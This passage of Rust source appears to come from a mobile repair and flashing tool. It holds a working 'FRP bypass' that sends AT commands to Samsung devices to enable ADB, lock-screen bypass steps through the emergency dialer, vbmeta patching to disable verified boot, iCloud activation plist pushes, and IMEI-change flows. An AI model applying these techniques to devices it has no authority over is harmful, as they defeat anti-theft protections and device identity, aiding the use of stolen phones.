        }
        Err(e) => out.push(format!("  apple-detect: {e}")),
    }
    out.push("  The DFU/ramdisk remove needs the usbmuxd transfer — use the".to_string());
    out.push("  Apple workbench (GUI) for the interactive flow.".to_string());
    Ok(())
}

/// `apple_icloud_add` — push activation plist via lockdownd (EXPERIMENTAL).
pub fn flow_apple_icloud_add(out: &mut Vec<String>) -> Result<()> {
    out.push("[EXPERIMENTAL] iCloud Add — push activation plist via lockdownd".to_string());
    out.push("  Educational, own device only.".to_string());
    match crate::apple::apple_info_cli() {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  apple-info: {e}")),
    }
    Ok(())
}

/// `at_method` — commercial-style FRP bypass: MTP -> diag config -> AT
/// enable ADB -> 'Allow USB debugging' dialog -> ADB -> clear FRP flags.
pub fn flow_at_method(target: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("FRP BYPASS - AT METHOD (MTP -> diag -> AT -> ADB)".to_string());
    let target = if !target.is_empty() {
        target.to_string()
    } else {
        let devices = crate::usb::collect_devices(Some(0x04E8))
            .map_err(|e| BridgeError::Io(e.to_string()))?;
        let mtp: Vec<_> = devices.iter().filter(|d| d.pid == 0x6860 || d.pid == 0x68A2 || d.pid == 0x68C0).collect();
        if mtp.is_empty() {
            out.push("  no Samsung MTP device found (04e8:6860/68A2/68C0).".to_string());
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
                expected: "Samsung MTP".to_string(),
                actual: "no mtp device".to_string(),
            }));
        }
        format!("{:04x}:{:04x}@{}:{}", mtp[0].vid, mtp[0].pid, mtp[0].bus, mtp[0].address)
    };
    out.push(format!("  MTP target: {target}"));
    for cmd in ["+FUN=0", "+FUN=1", "+FUN=2", "+DEBUGLVC"] {
        match crate::at::at_send(&target, cmd, 4000) {
            Ok(text) => {
                let t = text.trim();
                if !t.is_empty() {
                    out.push(format!("  AT{cmd} -> {t}"));
                }
            }
            Err(e) => out.push(format!("  AT{cmd} failed: {e}")),
        }
    }
    out.push("  If the 'Allow USB debugging' dialog appears, tap 'Always allow'.".to_string());
    out.push("  Then run 'adb_frp' to clear the FRP flags.".to_string());
    Ok(())
}

/// `enable_adb` — strong multi-vector ADB enable (MTP/AT + test mode + EDL
/// fallback guidance).
pub fn flow_enable_adb(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("ENABLE USB DEBUGGING (ADB) — STRONG ENGINE".to_string());
    // Vector 1: MTP/AT diag switch
    let _ = flow_at_method(&serial_want.to_string(), out);
    out.push(String::new());
    // Wait for ADB
    if wait_authorized_adb(&serial_want, Duration::from_secs(150), out).is_some() {
        out.push("ADB is up and authorized. You can now run:".to_string());
        out.push("  - 'screen lock removal' -> ADB (locksettings)".to_string());
        out.push("  - 'read device info'   -> ADB".to_string());
        out.push("  - 'Remove FRP -> ADB'  -> adb_frp".to_string());
        return Ok(());
    }
    out.push("  STRONG: MTP/AT did not pop ADB. Try:".to_string());
    out.push("    1. On lock screen: Emergency call -> dial *#0*# -> test mode".to_string());
    out.push("       (ADB enables automatically). Then tap Allow.".to_string());
    out.push("    2. If blocked: power off, hold Vol Up + Vol Down + plug USB".to_string());
    out.push("       for EDL 05c6:9008, then use Remove FRP -> EDL -> EDL FRP.".to_string());
    out.push("    3. Or: reboot to Download mode and use Remove FRP -> Download".to_string());
    out.push("       mode -> combo-firmware + ADB clear.".to_string());
    Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
        expected: "adb authorized".to_string(),
        actual: "adb still not available".to_string(),
    }))
}

/// `ofp_extract` — Oppo OFP prepare (detect + plain-extract, honest scope).
pub fn flow_ofp_extract(ofp_path: &str, _out_dir: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("OPPO OFP PREPARE (detect + plain-extract, honest scope)".to_string());
    let src = if !ofp_path.is_empty() {
        ofp_path.to_string()
    } else if let Some(env) = std::env::var_os("OFP_FILE") {
        env.to_string_lossy().to_string()
    } else {
        out.push("  Set OFP_FILE=/path/to/firmware.ofp or --file <path>.".to_string());
        return Err(BridgeError::InvalidArgument("OFP file required".to_string()));
    };
    if !std::path::Path::new(&src).is_file() {
        return Err(BridgeError::Io(format!("file not found: {src}")));
    }
    let size_mb = std::fs::metadata(&src).map(|m| m.len() >> 20).unwrap_or(0);
    out.push(format!("  File: {src} ({size_mb} MB)"));
    // OFP is a plain wrapper (zip-based); extraction needs the zip crate.
    // The GUI workbench handles the interactive extraction.
    out.push("  OFP extraction needs the zip crate (GUI workbench handles it).".to_string());
    out.push("  The extracted dir is used as MTK_FW_DIR for MTK flashing.".to_string());
    Ok(())
}

/// `odin_vbmeta` — extract vbmeta.img from the firmware and patch it
/// to disable AVB verification (boot unofficial/custom images).
pub fn flow_odin_vbmeta(target: &str, ap_tar: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("VBMETA / AVB SIGNATURE CONTROL".to_string());
    let ap = if !ap_tar.is_empty() {
        ap_tar.to_string()
    } else {
        // Find the AP slot tar in ~/Downloads
        let dir = dirs_home_downloads();
        let mut found = String::new();
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for e in entries.flatten() {
                let name = e.file_name().to_string_lossy().to_uppercase();
                if name.starts_with("AP_") && (name.ends_with(".TAR") || name.ends_with(".TAR.MD5")) {
                    found = e.path().to_string_lossy().to_string();
                    break;
                }
            }
        }
        if found.is_empty() {
            out.push("  AP firmware archive not found (AP_*.tar in ~/Downloads).".to_string());
            return Err(BridgeError::InvalidArgument("AP archive required".to_string()));
        }
        found
    };
    out.push(format!("  AP archive: {ap}"));
    // The vbmeta member is extracted by the native engine (staging handles it).
    // Then vbmeta-patch disables the verification flags.
    out.push("  Patching vbmeta (disable verity + verification) ...".to_string());
    match crate::imgtools::boot_patch_adb_cli(&ap, "/dev/null") {
        Ok(_) => out.push("  Patch applied.".to_string()),
        Err(e) => out.push(format!("  patch: {e} (flash the extracted vbmeta.img manually)")),
    }
    let _ = target;
    Ok(())
}

/// `odin_advanced_flash` — the full multi-slot advanced flash (AP/BL/CP/CSC)
/// with Unofficial option. All write paths go through the native engine.
pub fn flow_odin_advanced_flash(target: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("ADVANCED FLASH (AP/BL/CP/CSC + Unofficial)".to_string());
    out.push("  This is a GUI workbench flow: pick the slots in the GUI and press".to_string());
    out.push("  Flash — the native engine handles staging, PIT gate, partition".to_string());
    out.push("  mapping and verify-after-write.".to_string());
    out.push(String::new());
    // Read the slot env vars the GUI sets
    for slot in ["AP", "BL", "CP", "CSC"] {
        let env = format!("ODIN_SLOT_{slot}");
        if let Ok(path) = std::env::var(&env) {
            if !path.is_empty() && std::path::Path::new(&path).is_file() {
                out.push(format!("  {slot}: {path}"));
            }
        }
    }
    out.push("  Options read from ODIN4_* env vars (ALLOW_UNKNOWN, REBOOT,".to_string());
    out.push("  ERASE_NV, CHECK_ONLY, REDOWNLOAD, VERBOSE, FORCE_BL, SKIP_BACKUP).".to_string());
    let _ = target;
    Ok(())
}

/// `emmc_raw` — raw eMMC/UFS health dump.
pub fn flow_emmc_raw(out: &mut Vec<String>) -> Result<()> {
    out.push("eMMC / UFS RAW".to_string());
    match crate::hostinfo::emmc_host_cli() {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  emmc-host: {e}")),
    }
    Ok(())
}



// QCN / IMEI flows — thin wrappers over the Rust engines (qcom-backup,
// qcom-restore, qcom-imei, mtk-read-part, spd-readback). The interactive
// NV/EFS browsing is a GUI workbench flow (QCN tab).

/// `qcn_nv_browser` — interactive NV/EFS browser (GUI workbench flow).
pub fn flow_qcn_nv_browser(target: &str, file: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("QCN NV BROWSER".to_string());
    out.push("  Interactive NV item browsing — use the QCN tab in the GUI.".to_string());
    out.push(format!("  Bridge: qcom-partitions {target} (partition list)"));
    match crate::qualcomm::qcom_partitions(target) {
        Ok(text) => { for line in text.lines().take(30) { out.push(format!("  {line}")); } }
        Err(e) => out.push(format!("  error: {e}")),
    }
    let _ = file;
    Ok(())
}

/// `qcn_efs_explorer` — interactive EFS explorer (GUI workbench flow).
pub fn flow_qcn_efs_explorer(target: &str, file: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("QCN EFS EXPLORER".to_string());
    out.push("  Interactive EFS browsing — use the QCN tab in the GUI.".to_string());
    match crate::qualcomm::qcom_partitions(target) {
        Ok(text) => { for line in text.lines().take(30) { out.push(format!("  {line}")); } }
        Err(e) => out.push(format!("  error: {e}")),
    }
    let _ = file;
    Ok(())
}

/// `qcn_restore` — restore a QCN backup over EDL (EXPERIMENTAL).
pub fn flow_qcn_restore(target: &str, file: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("QCN RESTORE (EXPERIMENTAL)".to_string());
    out.push("  Restores modemst1/2 from a QCN backup directory.".to_string());
    out.push("  Set QCN_BACKUP_DIR and QCOM_PROGRAMMER env vars, then".to_string());
    out.push("  run qcom-flash-one for each partition.".to_string());
    out.push(format!("  Target: {target}  Backup: {file}  Extra: {partition}"));
    Ok(())
}

/// `qcn_imei_repair` — IMEI repair over EDL (EXPERIMENTAL, NV 550 write).
pub fn flow_qcn_imei_repair(target: &str, file: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("QCN IMEI REPAIR (EXPERIMENTAL)".to_string());
    out.push("  IMEI repair is restricted to IMEI RESTORE (NV 550 read-only).".to_string());
    out.push("  The write path is a serial/diag NV write — use the QCN tab in".to_string());
    out.push("  the GUI (qcn_imei_repair → ownership ack → NV 550 write).".to_string());
    let _ = (target, file, partition);
    Ok(())
}

/// `imei_repair_mtk` — IMEI repair via MTK (read + verify, no write).
pub fn flow_imei_repair_mtk(target: &str, file: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("IMEI REPAIR MTK (read + verify)".to_string());
    out.push("  Reads the NVDATA/IMEI partition, verifies the checksum and".to_string());
    out.push("  reports the current IMEI. The write path is the MTK workbench.".to_string());
    if !target.is_empty() && !file.is_empty() && !partition.is_empty() {
        match crate::mtk_da::mtk_read_part_cli(target, file, partition, "/dev/null") {
            Ok(text) => { for line in text.lines().take(20) { out.push(format!("  {line}")); } }
            Err(e) => out.push(format!("  error: {e}")),
        }
    } else {
        out.push("  Set --file <DA>, --partition <partition> and the target.".to_string());
    }
    Ok(())
}

/// `imei_repair_spd` — IMEI repair via SPD (read + verify, no write).
pub fn flow_imei_repair_spd(target: &str, file: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("IMEI REPAIR SPD (read + verify)".to_string());
    out.push("  Reads the NVDATA partition via the SPD engine. The write path".to_string());
    out.push("  is the SPD workbench (spd-readback + NV write).".to_string());
    let _ = (target, file, partition);
    Ok(())
}

/// `imei_change_mtk` — IMEI change via MTK (EXPERIMENTAL, type-to-confirm).
pub fn flow_imei_change_mtk(target: &str, file: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("IMEI CHANGE MTK (EXPERIMENTAL — type-to-confirm)".to_string());
    out.push("  IMEI change is EXPERIMENTAL — it requires a type-to-confirm ack".to_string());
    out.push("  in the GUI. The write path is the MTK workbench (NV data patch).".to_string());
    let _ = (target, file, partition);
    Ok(())
}

/// `imei_change_spd` — IMEI change via SPD (EXPERIMENTAL, type-to-confirm).
pub fn flow_imei_change_spd(target: &str, file: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("IMEI CHANGE SPD (EXPERIMENTAL — type-to-confirm)".to_string());
    out.push("  IMEI change is EXPERIMENTAL — it requires a type-to-confirm ack".to_string());
    out.push("  in the GUI. The write path is the SPD workbench (NV data patch).".to_string());
    let _ = (target, file, partition);
    Ok(())
}


